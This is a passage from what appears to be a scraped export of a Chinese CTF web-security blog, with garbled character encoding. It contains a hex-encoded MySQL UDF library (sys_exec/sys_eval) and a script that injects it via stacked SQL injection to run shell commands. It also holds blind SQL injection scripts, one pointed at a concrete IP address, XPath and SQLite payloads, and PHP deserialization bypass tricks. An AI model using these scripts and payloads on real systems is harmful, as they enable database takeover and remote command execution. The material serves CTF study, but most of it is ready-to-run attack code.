FFFF9C0100005EFCFFFFBC010000C5FCFFFFDC010000CFFCFFFFFC010000FEFCFFFF1C02000065FDFFFF3C0200006FFDFFFF5C0200001400000000000000017A5200017810011B0C0708900100001C0000001C00000064F8FFFF4900000000410E108602430D0602440C070800001C0000003C0000008DF8FFFF0A00000000410E108602430D06450C07080000001C0000005C00000077F8FFFF4C00000000410E108602430D0602470C070800001C0000007C000000A3F8FFFF5D00000000410E108602430D0602580C070800001C0000009C000000E0F8FFFF0A00000000410E108602430D06450C07080000001C000000BC000000CAF8FFFF6300000000410E108602430D06025E0C070800001C000000DC0000000DF9FFFFF100000000410E108602430D0602EC0C070800001C000000FC000000DEF9FFFF2B00000000410E108602430D06660C07080000001C0000001C010000E9F9FFFFD100000000410E108602430D0602CC0C070800001C0000003C0100009AFAFFFF6700000000410E108602430D0602620C070800001C0000005C010000E1FAFFFF0A00000000410E108602430D06450C07080000001C0000007C010000CBFAFFFF2F00000000410E108602430D066A0C07080000001C0000009C010000DAFAFFFF6700000000410E108602430D0602620C070800001C000000BC01000021FBFFFF0A00000000410E108602430D06450C07080000001C000000DC0100000BFBFFFF5501000000410E108602430D060350010C0708000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF00000000000000000000000000000000F01420000000000001000000000000006F010000000000000C0000000000000088090000000000000D000000000000004811000000000000F5FEFF6F00000000B8010000000000000500000000000000E805000000000000060000000000000070020000000000000A000000000000009D010000000000000B000000000000001800000000000000030000000000000090162000000000000200000000000000380100000000000014000000000000000700000000000000170000000000000050080000000000000700000000000000F0070000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000D007000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000008607000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F81420000000000000000000000000000000000000000000B609000000000000C609000000000000D609000000000000E609000000000000F609000000000000060A000000000000160A000000000000260A000000000000360A000000000000460A000000000000560A000000000000660A000000000000760A0000000000004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D3429004743433A2028474E552920342E342E3720323031323033313320285265642048617420342E342E372D31372900002E73796D746162002E737472746162002E7368737472746162002E6E6F74652E676E752E6275696C642D6964002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E646174612E72656C2E726F002E64796E616D6963002E676F74002E676F742E706C74002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001B0000000700000002000000000000009001000000000000900100000000000024000000000000000000000000000000040000000000000000000000000000002E000000F6FFFF6F0200000000000000B801000000000000B801000000000000B400000000000000030000000000000008000000000000000000000000000000380000000B000000020000000000000070020000000000007002000000000000780300000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000E805000000000000E8050000000000009D0100000000000000000000000000000100000000000000000000000000000048000000FFFFFF6F0200000000000000860700000000000086070000000000004A0000000000000003000000000000000200000000000000020000000000000055000000FEFFFF6F0200000000000000D007000000000000D007000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000F007000000000000F00700000000000060000000000000000300000000000000080000000000000018000000000000006E000000040000000200000000000000500800000000000050080000000000003801000000000000030000000A000000080000000000000018000000000000007800000001000000060000000000000088090000000000008809000000000000180000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000A009000000000000A009000000000000E0000000000000000000000000000000040000000000000010000000000000007E000000010000000600000000000000800A000000000000800A000000000000C80600000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000481100000000000048110000000000000E000000000000000000000000000000040000000000000000000000000000008A00000001000000020000000000000058110000000000005811000000000000EC0000000000000000000000000000000800000000000000000000000000000092000000010000000200000000000000441200000000000044120000000000008400000000000000000000000000000004000000000000000000000000000000A0000000010000000200000000000000C812000000000000C812000000000000FC01000000000000000000000000000008000000000000000000000000000000AA000000010000000300000000000000C814200000000000C8140000000000001000000000000000000000000000000008000000000000000000000000000000B1000000010000000300000000000000D814200000000000D8140000000000001000000000000000000000000000000008000000000000000000000000000000B8000000010000000300000000000000E814200000000000E8140000000000000800000000000000000000000000000008000000000000000000000000000000BD000000010000000300000000000000F014200000000000F0140000000000000800000000000000000000000000000008000000000000000000000000000000CA000000060000000300000000000000F814200000000000F8140000000000008001000000000000040000000000000008000000000000001000000000000000D3000000010000000300000000000000781620000000000078160000000000001800000000000000000000000000000008000000000000000800000000000000D8000000010000000300000000000000901620000000000090160000000000008000000000000000000000000000000008000000000000000800000000000000E1000000080000000300000000000000101720000000000010170000000000001000000000000000000000000000000008000000000000000000000000000000E60000000100000030000000000000000000000000000000101700000000000059000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000006917000000000000EF00000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000581F00000000000068070000000000001B0000002C00000008000000000000001800000000000000090000000300000000000000000000000000000000000000C02600000000000042030000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100900100000000000000000000000000000000000003000200B80100000000000000000000000000000000000003000300700200000000000000000000000000000000000003000400E80500000000000000000000000000000000000003000500860700000000000000000000000000000000000003000600D00700000000000000000000000000000000000003000700F00700000000000000000000000000000000000003000800500800000000000000000000000000000000000003000900880900000000000000000000000000000000000003000A00A00900000000000000000000000000000000000003000B00800A00000000000000000000000000000000000003000C00481100000000000000000000000000000000000003000D00581100000000000000000000000000000000000003000E00441200000000000000000000000000000000000003000F00C81200000000000000000000000000000000000003001000C81420000000000000000000000000000000000003001100D81420000000000000000000000000000000000003001200E81420000000000000000000000000000000000003001300F01420000000000000000000000000000000000003001400F81420000000000000000000000000000000000003001500781620000000000000000000000000000000000003001600901620000000000000000000000000000000000003001700101720000000000000000000000000000000000003001800000000000000000000000000000000000100000002000B00800A0000000000000000000000000000110000000400F1FF000000000000000000000000000000001C00000001001000C81420000000000000000000000000002A00000001001100D81420000000000000000000000000003800000001001200E81420000000000000000000000000004500000002000B00A00A00000000000000000000000000005B00000001001700101720000000000001000000000000006A00000001001700181720000000000008000000000000007800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&#x27;codes=[]for i in range(0,len(code),128): codes.append(code[i:min(i+128,len(code))])#å»ºä¸´æ—¶è¡¨#sql=&#x27;&#x27;&#x27;create table temp(data longblob)&#x27;&#x27;&#x27;#payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)#requests.get(url+payload)#æ¸…ç©ºä¸´æ—¶è¡¨sql=&#x27;&#x27;&#x27;delete from temp&#x27;&#x27;&#x27;payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#æ’å…¥ç¬¬ä¸€æ®µæ•°æ®sql=&#x27;&#x27;&#x27;insert into temp(data) values (0x&#123;&#125;)&#x27;&#x27;&#x27;.format(codes[0])payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#æ›´æ–°è¿æ¥å‰©ä½™æ•°æ®for k in range(1,len(codes)): sql=&#x27;&#x27;&#x27;update temp set data = concat(data,0x&#123;&#125;)&#x27;&#x27;&#x27;.format(codes[k]) payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql) requests.get(url+payload)#10.3.18-MariaDB #å†™å…¥soæ–‡ä»¶sql=&#x27;&#x27;&#x27;select data from temp into dumpfile &#x27;/usr/lib/mariadb/plugin/udf.so\\&#x27;&#x27;&#x27;&#x27;payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#å¼•å…¥è‡ªå®šä¹‰å‡½æ•°sql=&#x27;&#x27;&#x27;create function sys_eval returns string soname &#x27;udf.so\\&#x27;&#x27;&#x27;&#x27;payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#å‘½ä»¤æ‰§è¡Œï¼Œç»“æœæ›´æ–°åˆ°ç•Œé¢sql=&#x27;&#x27;&#x27;update ctfshow_user set pass=(select sys_eval(&#x27;cat /flag.her?&#x27;))&#x27;&#x27;&#x27;payload=&#x27;&#x27;&#x27;0&#x27;;&#123;&#125;;-- A&#x27;&#x27;&#x27;.format(sql)requests.get(url+payload)#æŸ¥çœ‹ç»“æœr=requests.get(url[:-4]+&#x27;?page=1&amp;limit=10&#x27;)print(r.text) â€‹ SQLite3å†…ç½®è¡¨ï¼š select name,sql from sqlite_master select group_concat(sql) from sqlite_master â€‹ NoSQL MongoDBMongoDB æ³¨å…¥æŒ‡åŒ— â€‹ XPathXPath å³ä¸º XML è·¯å¾„è¯­è¨€ï¼Œæ˜¯ W3C XSLT æ ‡å‡†çš„ä¸»è¦å…ƒç´ ï¼Œå®ƒæ˜¯ä¸€ç§ç”¨æ¥ç¡®å®š XMLï¼ˆæ ‡å‡†é€šç”¨æ ‡è®°è¯­è¨€çš„å­é›†ï¼‰æ–‡æ¡£ä¸­æŸéƒ¨åˆ†ä½ç½®çš„è¯­è¨€ã€‚ XpathæŸ¥è¯¢è¯­å¥ï¼š $query=&quot;user/username[@name=&#39;&quot;.$user.&quot;&#39;]&quot;; æ³¨å…¥ç‚¹ï¼šURLã€è¡¨å•æˆ–å…¶å®ƒä¿¡æ¯ä¸Šé™„å¸¦æ¶æ„çš„ XPath æŸ¥è¯¢ä»£ç  æ³¨å…¥æ¼æ´éªŒè¯ï¼šè¾“å…¥id=1&#39;ã€`id=-1çœ‹é¡µé¢æ˜¯å¦è¿”å›æŠ¥é”™ä¿¡æ¯ æ³¨å…¥ä¸‡èƒ½å…¬å¼ï¼šid=1&#39; or 1=1 or &#39;&#39;=&#39; ä¸‡èƒ½è®¿é—®xmlæ–‡æ¡£æ‰€æœ‰èŠ‚ç‚¹çš„payload: &#39;]|//*|//*[&#39; â€‹ å¸¸ç”¨è„šæœ¬ å¸ƒå°”ç›²æ³¨123456789101112131415161718192021import stringimport requestsdic=&#x27;&#123;&#125;-_&#x27;+string.digits+string.ascii_lowercaseurl=&#x27;xxxxxxx&#x27;now=&#x27;&#x27;for i in range(1,50): flag=0 for j in dic: payload=&#x27;&#x27;&#x27;xxxxxxx&#x27;&#x27;&#x27;.format() #print(payload) data=&#123;&#x27;username&#x27;:payload,&#x27;password&#x27;:&#x27;xxxxx&#x27;&#125; r=requests.post(url,data=data) #print(r.text) if &#x27;xxx&#x27; in r.text: now+=j print(now) flag=1 break if flag==0: break 12345678910111213141516171819202122232425262728293031323334import requestsurl = &quot;xxx&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 payload = f&#x27;if(ascii(substr((select(database())),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=&quot;ctfshow&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(flag4s))from(ctfshow.flags)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27; data = &#123; &#x27;id&#x27;: f&quot;100&#x27;)||&#123;payload&#125;||(&#x27;0&quot; &#125; r = requests.get(url,params=data) # r = requests.post(url,data=data) if &quot;xxx&quot; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) 12345678910111213141516171819202122232425262728293031323334353637# Mysql8æ–°ç‰¹æ€§import requestsdef bind_sql(): flag = &quot;&quot; dic = &quot;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/-,+*)(&amp;%$#!&quot; for i in range(1000): f = flag for j in dic: _ = flag + j #payload = &quot;0||(binary&#x27;&#123;&#125;&#x27;,&#x27;&#x27;,3,4)&lt;(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/0,1)&quot;.format(_) #payload = &quot;0||(&#x27;cnss&#x27;,binary&#x27;&#123;&#125;&#x27;,3,4)&lt;(table/**/sys.schema_tables_with_full_table_scans/**/limit/**/1,1)&quot;.format(_) #payload = &quot;0||(&#x27;2&#x27;,&#x27;lisi&#x27;,binary&#x27;&#123;&#125;&#x27;)&lt;(table/**/users/**/limit/**/1,1)&quot;.format(_) payload = &quot;0||(&#x27;8&#x27;,binary&#x27;&#123;&#125;&#x27;)&lt;(table/**/cn55/**/limit/**/7,1)&quot;.format(_) data = &#123; &quot;id&quot;: payload &#125; r = requests.get(url=url, params=data) # r = requests.post(url, data=data) print(payload) if &#x27;xxx&#x27; in r.text: if j == &#x27;~&#x27;: flag = flag[:-1] + chr(ord(flag[-1])+1) print(flag) exit() flag += j print(flag) break if flag == f: break return flagif __name__ == &#x27;__main__&#x27;: # input url url = &#x27;http://124.221.34.13:55553/&#x27; result = bind_sql() print(result) æ—¶é—´ç›²æ³¨1234567891011121314151617181920212223import requestsimport stringimport timedic=&#x27;&#123;&#125;-_,&#x27;+string.ascii_lowercase+string.digitsurl=&#x27;xxxxxx&#x27;now=&#x27;&#x27;for i in range(1,50): flag=0 for j in dic: a=time.time() payload=&#x27;&#x27;&#x27;xxxxxx&#x27;&#x27;&#x27;.format() data=&#123;&#x27;ip&#x27;:payload,&quot;debug&quot;:0&#125; r=requests.post(url,data=data) b=time.time() if b-a&gt;1: now+=j flag=1 print(now) break if flag==0: break 12345678910111213141516171819202122232425262728293031323334import requestsurl = &quot;http://xxx/?id=1%22and%20&quot;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 # payload = f&#x27;if(ascii(substr((select/**/group_concat(table_name)from(information_schema.tables)where(table_schema=&quot;yyy&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.6),0)%23&#x27; # payload = f&#x27;if(ascii(substr((select/**/group_concat(column_name)from(information_schema.columns)where(table_schema=&quot;yyy&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.6),0)%23&#x27; payload = f&#x27;if(ascii(substr((select/**/group_concat(xxx)from(yyy.zzz)),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(0.6),0)%23&#x27; try: # data = &#123; # &#x27;uname&#x27;:f&quot;admin&#x27;)and &#123;payload&#125;#&quot;, # &#x27;passwd&#x27;: &#x27;1&#x27; # &#125; r = requests.get(url + payload,timeout=0.5) # r = requests.post(url, data=data, timeout=0.5) tail = mid except: head = mid + 1 if head != 32: result += chr(head) else: break print(result)","categories":[{"name":"web","slug":"web","permalink":"https://lazzzaro.github.io/categories/web/"}],"tags":[{"name":"SQL","slug":"SQL","permalink":"https://lazzzaro.github.io/tags/SQL/"},{"name":"æ³¨å…¥","slug":"æ³¨å…¥","permalink":"https://lazzzaro.github.io/tags/%E6%B3%A8%E5%85%A5/"}],"author":"Lazzaro"},{"title":"ååºåˆ—åŒ–","slug":"web-ååºåˆ—åŒ–","date":"2020-05-14T17:10:23.000Z","updated":"2023-10-10T13:29:50.613Z","comments":true,"path":"2020/05/15/web-ååºåˆ—åŒ–/","permalink":"https://lazzzaro.github.io/2020/05/15/web-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"æ¦‚å¿µï¼šåºåˆ—åŒ–å°±æ˜¯ä½¿ç”¨serialize()å°†å¯¹è±¡çš„ç”¨å­—ç¬¦ä¸²çš„æ–¹å¼è¿›è¡Œè¡¨ç¤ºï¼Œååºåˆ—åŒ–æ˜¯ä½¿ç”¨unserialize()å°†åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œæ„é€ æˆç›¸åº”çš„å¯¹è±¡ï¼Œååºåˆ—åŒ–æ˜¯åºåˆ—åŒ–çš„é€†è¿‡ç¨‹ã€‚ åºåˆ—åŒ–çš„å¯¹è±¡å¯ä»¥æ˜¯classä¹Ÿå¯ä»¥æ˜¯Array,stringç­‰å…¶ä»–å¯¹è±¡ã€‚ é—®é¢˜åŸå› ï¼šæ¼æ´çš„æ ¹æºåœ¨äºunserialize()å‡½æ•°çš„å‚æ•°å¯æ§ã€‚å¦‚æœååºåˆ—åŒ–å¯¹è±¡ä¸­å­˜åœ¨é­”æœ¯æ–¹æ³•ï¼Œè€Œä¸”é­”æœ¯æ–¹æ³•ä¸­çš„ä»£ç æˆ–å˜é‡ç”¨æˆ·å¯æ§ï¼Œå°±å¯èƒ½äº§ç”Ÿååºåˆ—åŒ–æ¼æ´ï¼Œæ ¹æ®ååºåˆ—åŒ–åä¸åŒçš„ä»£ç å¯ä»¥å¯¼è‡´å„ç§æ”»å‡»ï¼Œå¦‚ä»£ç æ³¨å…¥ã€SQLæ³¨å…¥ã€ç›®å½•éå†ç­‰ç­‰ã€‚ â€‹ åºåˆ—åŒ–æ ¼å¼å¯¹è±¡ç±»å‹:å¯¹è±¡åé•¿åº¦:â€å¯¹è±¡åâ€:å¯¹è±¡æˆå‘˜å˜é‡ä¸ªæ•°:{å˜é‡1ç±»å‹:å˜é‡å1é•¿åº¦:å˜é‡å1; å‚æ•°1ç±»å‹:å‚æ•°1é•¿åº¦:å‚æ•°1; å˜é‡2ç±»å‹:å˜é‡å2é•¿åº¦:â€å˜é‡å2â€; å‚æ•°2ç±»å‹:å‚æ•°2é•¿åº¦:å‚æ•°2;â€¦ â€¦} å¦‚ï¼š O:6:â€Personâ€:2:{s:12:â€ Person nameâ€;s:8:â€Thinkingâ€;s:11:â€ Person sexâ€;s:3:â€manâ€;} a:2:{s:4:â€nameâ€;s:8:â€Thinkingâ€;s:3:â€sexâ€;s:3:â€manâ€;} å¯¹è±¡ç±»å‹ï¼šClass-Oï¼ŒArray-aã€‚ å˜é‡å’Œå‚æ•°ç±»å‹ï¼šstring-sï¼Œint-iï¼ŒArray-aï¼ŒæŒ‡é’ˆå¼•ç”¨-Rã€‚ åºåˆ—ç¬¦å·ï¼šå‚æ•°ä¸å˜é‡ä¹‹é—´ç”¨åˆ†å·(;)éš”å¼€ï¼ŒåŒä¸€å˜é‡å’ŒåŒä¸€å‚æ•°ä¹‹é—´çš„æ•°æ®ç”¨å†’å·(:)éš”å¼€ã€‚ å¯¹äºæŒ‡é’ˆå¼•ç”¨ï¼š åœ¨åºåˆ—åŒ–ä¸­ï¼Œç¬¬ä¸€ä¸ªå¯¹è±¡æ˜¯ç±»ï¼Œç¬¬äºŒä¸ªå¯¹è±¡æ‰æ˜¯ç±»é‡Œçš„å¯¹è±¡ã€‚ ç±»å‹ ç»“æ„ å­—ç¬¦ä¸² s:size:value; æ•´æ•° i:value; å¸ƒå°”å€¼ b:value;(ä¿å­˜1æˆ–0) ç©ºå€¼ N; æ•°ç»„ a:size:{key definition;value definition;(repeated per element)} å¯¹è±¡ O:strlen(object name):object name:object size:{s:strlen(property name):property name:property definition;(repeated per property)} æŒ‡é’ˆå¼•ç”¨ R:2; â€‹ ä¸‰ç§è®¿é—®æ§åˆ¶çš„åŒºåˆ«public: å˜é‡å protected: \\x00 + * + \\x00 + å˜é‡åï¼ˆæˆ– \\00 + * + \\00 + å˜é‡å æˆ– %00 + * + %00 + å˜é‡åï¼‰ private: \\x00 + ç±»å + \\x00 + å˜é‡åï¼ˆæˆ– \\00 + ç±»å + \\00 + å˜é‡å æˆ– %00 + ç±»å + %00 + å˜é‡åï¼‰ æ³¨ï¼š&gt;=php v7.2 ååºåˆ—åŒ–å¯¹è®¿é—®ç±»åˆ«ä¸æ•æ„Ÿï¼ˆprotected -&gt; publicï¼‰ â€‹ é­”æœ¯æ–¹æ³•12345678910111213__construct() #æ¯æ¬¡åˆ›å»ºæ–°å¯¹è±¡æ—¶å…ˆè°ƒç”¨æ­¤æ–¹æ³•__destruct() #æŸä¸ªå¯¹è±¡çš„æ‰€æœ‰å¼•ç”¨éƒ½è¢«åˆ é™¤æˆ–è€…é”€æ¯æ—¶è°ƒç”¨ï¼ˆæ²¡æœ‰å˜é‡æŒ‡åˆ°å½“å‰å¯¹è±¡æ—¶ä¹Ÿä¼šè¢«è§¦å‘ï¼Œå¦‚ a:2:&#123;i:0;O:4:&quot;User&quot;:0:&#123;&#125;i:0;s:3:&quot;xxx&quot;;&#125;ï¼Œè¢«è¦†ç›–åæ²¡æœ‰å˜é‡æŒ‡å‘Userå¯¹è±¡ï¼‰__toString() #æŠŠç±»è¢«å½“åšä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨__wakeup() #ä½¿ç”¨unserializeå‡½æ•°ï¼Œååºåˆ—åŒ–æ¢å¤å¯¹è±¡ä¹‹å‰æ—¶è°ƒç”¨__sleep() #ä½¿ç”¨serialize()å‡½æ•°ï¼Œåºåˆ—åŒ–å¯¹è±¡ä¹‹å‰æ—¶è°ƒç”¨__call() #åœ¨å¯¹è±¡ä¸­ï¼Œè°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•æˆ–è°ƒç”¨æƒé™ä¸è¶³æ—¶è°ƒç”¨__callstatic() #åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­ï¼Œè°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() #è®¿é—®ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨__set() #è®¾ç½®ä¸å­˜åœ¨çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨__invoke() #å½“å°è¯•ä»¥è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶è§¦å‘__autoload() #å°è¯•åŠ è½½æœªå®šä¹‰çš„ç±»__isset() #åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() #åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘ â€‹ ç»•è¿‡æ–¹æ³• __wakeup()å¤±æ•ˆ PHP5&lt;5.6.25 æˆ– PHP7&lt;7.0.10 å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­ï¼Œå¦‚æœè¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡__wakeup()çš„æ‰§è¡Œã€‚ å¦‚ï¼šO:4:&quot;Demo&quot;:2:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125; PHP7.3 Serialize ç‰¹æ€§ï¼šO æ”¹ä¸º Cï¼ˆéœ€è¦åˆ©ç”¨å†…ç½®äº†Serializableæ¥å£çš„ç±»ï¼‰ PHP RFC: New custom object serialization mechanism bypass __wakeup å†…ç½®ç±» ArrayObjectï¼š 1234$arr=array(&quot;a&quot;=&gt;1,&quot;b&quot;=&gt;2);$ao=new ArrayObject($arr);echo serialize($ao);//C:11:&quot;ArrayObject&quot;:45:&#123;x:i:0;a:2:&#123;s:1:&quot;a&quot;;i:1;s:1:&quot;b&quot;;i:2;&#125;;m:a:0:&#123;&#125;&#125; å…¶ä»–ç±»ï¼š ArrayIterator / RecursiveArrayIterator / SplObjectStorage å‚è€ƒï¼šctfshow æ„šäººæ¯ - easy_php ç»•è¿‡preg_match() åŒ¹é…çš„å…³é”®å­— PHPä½ç‰ˆæœ¬ å¯ä½¿ç”¨+ï¼Œ&lt;ç»•è¿‡æ­£åˆ™ï¼Œå¦‚ï¼š O:+4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125; O:&lt;4:&quot;Demo&quot;:1:&#123;s:10:&quot;Demofile&quot;;s:16:&quot;f15g_1s_here.php&quot;;&#125; æ™®é€šå­—ç¬¦ä¸² PHPåºåˆ—åŒ–ä¸­å­˜åœ¨åºåˆ—åŒ–ç±»å‹ Sï¼Œç›¸è¾ƒäºå°å†™çš„ sï¼Œå¤§å†™ S æ˜¯escapedå­—ç¬¦ä¸²ï¼Œä¼šå°† \\xx å½¢å¼ä½œä¸ºä¸€ä¸ª16è¿›åˆ¶å­—ç¬¦å¤„ç†ï¼Œå¦‚ï¼šn çš„åå…­è¿›åˆ¶æ˜¯ 6eï¼Œæ‰€ä»¥æŠŠ nameæ›¿æ¢ä¸º \\6eame å³å¯ç»•è¿‡ã€‚ /^O:\\d+/ serialize(array($data)) ç»•è¿‡ throw new Exception å»æ‰æœ€åçš„å¤§æ‹¬å·ï¼Œåˆ©ç”¨ååºåˆ—åŒ–æŠ¥é”™æ¥é˜²æ­¢è¿›å…¥ Exception GC a:2:&#123;i:0;O:7:&quot;getflag&quot;:&#123;&#125;i:0;i:0;&#125; å› ä¸ºååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯é¡ºåºæ‰§è¡Œçš„ï¼Œæ‰€ä»¥åˆ°ç¬¬ä¸€ä¸ªå±æ€§æ—¶ï¼Œä¼šå°†Array[0]è®¾ç½®ä¸ºgetflagå¯¹è±¡ï¼ŒåŒæ—¶æˆ‘ä»¬åˆå°†Array[0]è®¾ç½®ä¸ºnullï¼Œè¿™æ ·å‰é¢çš„getflagå¯¹è±¡ä¾¿ä¸¢å¤±äº†å¼•ç”¨ï¼Œå°±ä¼šè¢«GCæ‰€æ•è·ï¼Œä¾¿å¯ä»¥æ‰§è¡Œ__destructã€‚ ç»•è¿‡ md5+sha1 éªŒè¯åˆ¤æ–­æ¡ä»¶ï¼š 123if( ($this-&gt;var1 != $this-&gt;var2) &amp;&amp; (md5($this-&gt;var1) === md5($this-&gt;var2)) &amp;&amp; (sha1($this-&gt;var1) === sha1($this-&gt;var2)) ) &#123; eval($this-&gt;var1);&#125; ä¼ 